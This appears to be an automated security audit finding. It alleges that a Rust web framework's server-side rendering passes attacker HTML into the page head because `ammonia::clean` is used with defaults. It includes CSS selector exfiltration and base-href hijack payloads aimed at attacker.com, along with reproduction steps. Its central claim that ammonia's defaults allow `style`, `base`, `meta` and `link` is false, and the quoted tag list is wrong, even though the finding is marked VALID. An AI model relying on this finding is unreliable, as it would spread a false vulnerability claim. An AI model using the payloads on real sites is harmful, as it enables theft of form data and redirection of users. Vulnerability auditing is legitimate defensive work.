---
Phase: 8
Sequence: 005
Slug: ssr-head-extra-injection
Verdict: VALID
Rationale: head_extra content is sanitized with default ammonia configuration which allows dangerous tags (base, style, meta refresh) usable for CSS data exfiltration and base URL hijacking when template context is user-controlled.
Severity-Original: medium
PoC-Status: pending
Pre-FP-Flag: none
Debate: piolium/attack-surface/balanced-chamber-summary.md
Sources:
  - crates/crepuscularity-web/src/ssr.rs:191-192
status: valid
---

# SSR `head_extra` Insufficient Sanitization

## Summary

The `SsrDocument.head_extra` field allows injecting raw HTML into the `<head>` section of SSR-rendered pages. While it passes through `ammonia::clean` for sanitization, the default ammonia configuration allows many HTML tags that can be abused for CSS injection, clickjacking, or information disclosure.

In multi-tenant or template-upload scenarios where template context is user-controlled, this becomes exploitable.

## Location

`crates/crepuscularity-web/src/ssr.rs:191-192`

```rust
let head_safe = ammonia::clean(doc.head_extra);
```

## Attacker Control

The `head_extra` field is populated from template context variables. In single-tenant SSR (templates controlled by the application developer), this is not directly attacker-controlled. However, in multi-tenant SaaS or template-upload scenarios where users provide their own `.crepus` templates and context, an attacker can set `head_extra` to malicious values.

## Trust Boundary Crossed

Template rendering boundary: Template context → HTML `<head>`. When user-supplied templates are rendered, this crosses from untrusted user input to HTML output.

## Impact

**MEDIUM** — The default `ammonia::clean()` (v4.1.2) allows these tags in `<head>` context:

| Tag | Abuse |
|-----|-------|
| `<base href="https://attacker.com/">` | Hijacks all relative URLs on the page |
| `<style>` | CSS injection for data exfiltration via CSS selectors |
| `<meta http-equiv="refresh" content="0;url=...">` | Redirects page to attacker site |
| `<link>` | Loads external resources, exfiltrates via href |

While `<script>` tags are stripped (preventing direct XSS), CSS injection enables:
- **Data exfiltration**: `input[value^="a"] { background: url(https://attacker.com/a); }`
- **Phishing**: Base URL hijacking redirects form submissions and resource loads

## Evidence

`crates/crepuscularity-web/src/ssr.rs:191-192` — `ammonia::clean` with default configuration:
```rust
let head_safe = ammonia::clean(doc.head_extra);
```

Ammonia's default tag allowlist (from documentation) includes: `a`, `abbr`, `acronym`, `area`, `article`, `aside`, `b`, `bdi`, `bdo`, `blockquote`, `br`, `caption`, `center`, `cite`, `code`, `col`, `colgroup`, `data`, `dd`, `del`, `details`, `dfn`, `dir`, `div`, `dl`, `dt`, `em`, `figcaption`, `figure`, `footer`, `h1`-`h6`, `header`, `hgroup`, `hr`, `i`, `img`, `ins`, `kbd`, `li`, `map`, `mark`, `menu`, `nav`, `ol`, `optgroup`, `option`, `p`, `pre`, `q`, `rp`, `rt`, `ruby`, `s`, `samp`, `section`, `select`, `small`, `source`, `span`, `strike`, `strong`, `sub`, `summary`, `sup`, `table`, `tbody`, `td`, `tfoot`, `th`, `thead`, `time`, `tr`, `tt`, `u`, `ul`, `var`, `wbr`, **`head`**, **`link`**, **`meta`**, **`style`**, **`title`**, **`base`**.

The bolded tags are particularly dangerous in a `<head>` context.

## Existing Mitigations

- `ammonia::clean` strips `<script>` tags and event handlers
- URL schemes validated for `href`/`src` attributes (blocks `javascript:`)

## Reproduction Steps

1. Create a `.crepus` template that sets `head_extra` to: `<base href="https://attacker.com/">`
2. Render the template via `crepus render`
3. Observe that the `<base>` tag appears in the HTML `<head>`, causing all relative URLs to resolve to the attacker's domain
